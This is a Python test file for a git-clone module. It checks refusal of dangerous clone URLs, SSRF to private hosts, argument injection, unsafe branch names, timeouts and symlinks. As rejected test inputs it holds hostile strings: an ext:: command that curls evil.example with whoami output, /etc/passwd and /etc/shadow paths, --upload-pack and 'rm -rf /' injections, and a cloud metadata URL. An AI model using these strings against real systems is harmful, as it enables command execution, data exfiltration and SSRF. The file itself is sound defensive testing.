"""Git URL validation, SSRF defence, and one real clone.

The validation tests are the important ones: a clone URL is a string that ends
up in an argument list for a program that can be talked into running commands
(``ext::sh -c ...``) and into fetching from the server's own network.
"""

import os
import socket
import sys
import threading
import time
from collections.abc import Iterator
from pathlib import Path

import pytest

from app.core.config import Settings, get_settings
from app.ingestion.git_clone import (
    clone_repository,
    git_is_available,
    validate_branch,
    validate_repository_url,
)
from app.ingestion.limits import CloneFailedError, RepositoryUrlInvalidError
from tests.git_server import build_repository, find_http_backend, run_git, serve_repository


@pytest.fixture
def settings() -> Settings:
    return get_settings()


def local_settings(settings: Settings, **overrides: object) -> Settings:
    """A copy of the settings with a few values changed, for the tests that
    deliberately clone from 127.0.0.1."""
    return settings.model_copy(update=overrides)


# --- schemes --------------------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "file:///etc/passwd",
        "file://localhost/etc/shadow",
        "ext::sh -c 'curl evil.example/$(whoami)'",
        "git://github.com/pallets/flask",
        "ssh://git@github.com/pallets/flask",
        "git@github.com:pallets/flask.git",
        "javascript:alert(1)",
        "/etc/passwd",
        "../../etc/passwd",
        "https:/onlyoneslash.example",
    ],
)
def test_dangerous_schemes_are_refused(settings: Settings, url: str) -> None:
    with pytest.raises(RepositoryUrlInvalidError):
        validate_repository_url(url, settings)


def test_ext_urls_are_refused_even_disguised(settings: Settings) -> None:
    # ext:: is the one that actually executes a command, so it gets its own test.
    with pytest.raises(RepositoryUrlInvalidError):
        validate_repository_url("EXT::sh -c 'id'", settings)


def test_http_is_refused_unless_explicitly_allowed(settings: Settings) -> None:
    with pytest.raises(RepositoryUrlInvalidError):
        validate_repository_url("http://github.com/pallets/flask", settings)

    permissive = local_settings(settings, ALLOW_INSECURE_GIT_URLS=True)
    assert validate_repository_url("http://github.com/pallets/flask", permissive)


def test_https_is_accepted(settings: Settings) -> None:
    url = "https://github.com/pallets/flask.git"
    assert validate_repository_url(url, settings) == url


# --- SSRF -----------------------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "https://localhost/repo.git",
        "https://127.0.0.1/repo.git",
        "https://127.0.0.1:8000/repo.git",
        "https://10.0.0.5/internal.git",
        "https://192.168.1.10/internal.git",
        "https://172.16.4.4/internal.git",
        "https://169.254.169.254/latest/meta-data",  # cloud metadata service
        "https://[::1]/repo.git",
        "https://0.0.0.0/repo.git",
    ],
)
def test_private_and_loopback_hosts_are_refused(settings: Settings, url: str) -> None:
    with pytest.raises(RepositoryUrlInvalidError, match="private or local"):
        validate_repository_url(url, settings)


def test_credentials_in_the_url_are_refused(settings: Settings) -> None:
    with pytest.raises(RepositoryUrlInvalidError, match="credentials are not stored"):
        validate_repository_url("https://user:token@github.com/x/y.git", settings)


def test_an_unresolvable_host_is_refused(settings: Settings) -> None:
    with pytest.raises(RepositoryUrlInvalidError):
        validate_repository_url("https://no-such-host.invalid/x.git", settings)


def test_the_private_host_check_can_be_opted_out_of(settings: Settings) -> None:
    permissive = local_settings(settings, ALLOW_PRIVATE_GIT_HOSTS=True)
    assert validate_repository_url("https://10.0.0.5/internal.git", permissive)


# --- argument injection ---------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "--upload-pack=touch /tmp/pwned",
        "-u./evil",
        "--config=core.gitProxy=evil",
    ],
)
def test_option_looking_urls_are_refused(settings: Settings, url: str) -> None:
    # The message matters: it proves the leading-dash guard fired, and not
    # some later check that happens to reject the same string today. git reads
    # a leading "-" as an option, and --upload-pack= names a command to run.
    with pytest.raises(RepositoryUrlInvalidError, match="may not start with"):
        validate_repository_url(url, settings)


@pytest.mark.parametrize(
    "branch",
    [
        "--upload-pack=id",
        "main; rm -rf /",
        "main$(whoami)",
        "main`id`",
        "feature branch",
        "main\nmore",
        "x" * 200,
    ],
)
def test_dangerous_branch_names_are_refused(branch: str) -> None:
    with pytest.raises(RepositoryUrlInvalidError):
        validate_branch(branch)


@pytest.mark.parametrize("branch", ["main", "develop", "release/2.1", "fix_123", "v1.0.0"])
def test_ordinary_branch_names_are_accepted(branch: str) -> None:
    assert validate_branch(branch) == branch


def test_blank_branch_becomes_none() -> None:
    assert validate_branch("   ") is None
    assert validate_branch(None) is None


def test_an_overlong_url_is_refused(settings: Settings) -> None:
    with pytest.raises(RepositoryUrlInvalidError):
        validate_repository_url("https://example.com/" + "a" * 600, settings)


# --- a real clone ---------------------------------------------------------


@pytest.fixture
def served_repository(tmp_path: Path) -> Iterator[tuple[str, str]]:
    """A tiny git repository served over the real smart-HTTP protocol.

    Nothing is mocked: git clones over TCP from 127.0.0.1, so the command, the
    flags and the sanitised environment are all exercised.
    """
    if not git_is_available() or find_http_backend() is None:
        pytest.skip("git (with git-http-backend) is not installed")

    repository = tmp_path / "served" / "demo.git"
    build_repository(repository, {"app.py": "print('hello')\n", "README.md": "# demo\n"})
    with serve_repository(repository) as url:
        yield url, "main"


def test_a_real_clone_brings_back_files_and_a_commit(
    tmp_path: Path, settings: Settings, served_repository: tuple[str, str]
) -> None:
    url, branch = served_repository
    permissive = local_settings(
        settings, ALLOW_INSECURE_GIT_URLS=True, ALLOW_PRIVATE_GIT_HOSTS=True
    )
    # The URL still goes through validation, just with the local-host opt-in.
    validated = validate_repository_url(url, permissive)

    destination = tmp_path / "clone"
    result = clone_repository(
        url=validated, branch=branch, destination=destination, settings=permissive
    )

    assert (destination / "app.py").read_text() == "print('hello')\n"
    assert len(result.commit_hash) == 40
    assert result.branch == "main"
    # --depth 1 really took effect: a shallow clone carries this marker file,
    # and a full history of a large repository is exactly what we refuse to pull.
    assert (destination / ".git" / "shallow").exists()


def test_cloning_a_missing_branch_fails_cleanly(
    tmp_path: Path, settings: Settings, served_repository: tuple[str, str]
) -> None:
    url, _ = served_repository
    permissive = local_settings(
        settings, ALLOW_INSECURE_GIT_URLS=True, ALLOW_PRIVATE_GIT_HOSTS=True
    )

    with pytest.raises(CloneFailedError) as error:
        clone_repository(
            url=url, branch="no-such-branch", destination=tmp_path / "x", settings=permissive
        )

    # A useful message, with no server paths or raw git output in it.
    assert "no-such-branch" in error.value.message
    assert str(tmp_path) not in error.value.message
    assert "fatal:" not in error.value.message


def test_a_server_that_never_answers_is_cut_off(tmp_path: Path, settings: Settings) -> None:
    """Without the timeout, one unresponsive host would hold a worker forever."""
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind(("127.0.0.1", 0))
    listener.listen(8)  # git may open more than one connection
    port = listener.getsockname()[1]
    held = []

    def accept_and_stall() -> None:
        while True:
            try:
                connection, _ = listener.accept()
            except OSError:
                return
            held.append(connection)  # accepted, and answered never

    thread = threading.Thread(target=accept_and_stall, daemon=True)
    thread.start()

    impatient = local_settings(
        settings,
        ALLOW_INSECURE_GIT_URLS=True,
        ALLOW_PRIVATE_GIT_HOSTS=True,
        CLONE_TIMEOUT_SECONDS=5,
    )
    started = time.monotonic()
    try:
        with pytest.raises(CloneFailedError) as error:
            clone_repository(
                url=f"http://127.0.0.1:{port}/stalled.git",
                branch=None,
                destination=tmp_path / "stalled",
                settings=impatient,
            )
    finally:
        listener.close()
        for connection in held:
            connection.close()

    elapsed = time.monotonic() - started
    # The point of the test on every platform: the call returns, quickly, with
    # an error the user can be shown.
    assert elapsed < 20, f"the clone should not have run for {elapsed:.0f}s"
    if sys.platform != "win32":
        # Where git really does wait on a silent socket, the timeout is what
        # ends it. Windows git gives up on its own first, so the message there
        # is the generic clone failure.
        assert "longer than 5 seconds" in error.value.message


def test_a_timed_out_clone_leaves_no_git_process_behind(tmp_path: Path, settings: Settings) -> None:
    """Killing git is not enough: its network child holds the pipes.

    ``git clone`` delegates the transfer to ``git-remote-https``. Killing only
    the process we started leaves that child alive holding stdout and stderr,
    and collecting the output then blocks — the timeout fires and the request
    hangs anyway. The whole process group has to go.
    """
    if not git_is_available():
        pytest.skip("git is not installed")

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind(("127.0.0.1", 0))
    listener.listen(8)
    port = listener.getsockname()[1]
    held = []

    def accept_and_stall() -> None:
        while True:
            try:
                held.append(listener.accept()[0])
            except OSError:
                return

    threading.Thread(target=accept_and_stall, daemon=True).start()

    impatient = local_settings(
        settings,
        ALLOW_INSECURE_GIT_URLS=True,
        ALLOW_PRIVATE_GIT_HOSTS=True,
        CLONE_TIMEOUT_SECONDS=5,
    )
    started = time.monotonic()
    try:
        with pytest.raises(CloneFailedError):
            clone_repository(
                url=f"http://127.0.0.1:{port}/stalled.git",
                branch=None,
                destination=tmp_path / "stalled",
                settings=impatient,
            )
    finally:
        listener.close()
        for connection in held:
            connection.close()

    elapsed = time.monotonic() - started
    # Without the process-group kill this returns only when the transfer child
    # gives up on its own, which is minutes rather than seconds.
    assert elapsed < impatient.CLONE_TIMEOUT_SECONDS + 10, (
        f"the clone took {elapsed:.0f}s to give up"
    )


def test_a_symlink_in_the_repository_arrives_as_a_plain_file(
    tmp_path: Path, settings: Settings
) -> None:
    """``core.symlinks=false`` keeps a link out of the workspace.

    A repository can commit ``config -> /etc/passwd``. Checked out as a real
    link, a later phase reading "its" files would read the server's instead.
    """
    if not git_is_available() or find_http_backend() is None:
        pytest.skip("git (with git-http-backend) is not installed")

    repository = tmp_path / "served" / "linky.git"
    build_repository(repository, {"app.py": "print(1)\n"})
    os.symlink("/etc/passwd", repository / "config")
    run_git("add", "--all", cwd=repository)
    run_git("commit", "--quiet", "--message", "Add a link", cwd=repository)
    run_git("update-server-info", cwd=repository)

    permissive = local_settings(
        settings, ALLOW_INSECURE_GIT_URLS=True, ALLOW_PRIVATE_GIT_HOSTS=True
    )
    destination = tmp_path / "clone"
    with serve_repository(repository) as url:
        clone_repository(url=url, branch="main", destination=destination, settings=permissive)

    checked_out = destination / "config"
    assert checked_out.exists()
    assert not checked_out.is_symlink(), "a committed symlink must not be recreated as a link"
    assert checked_out.read_text().strip() == "/etc/passwd"  # the link target, as text
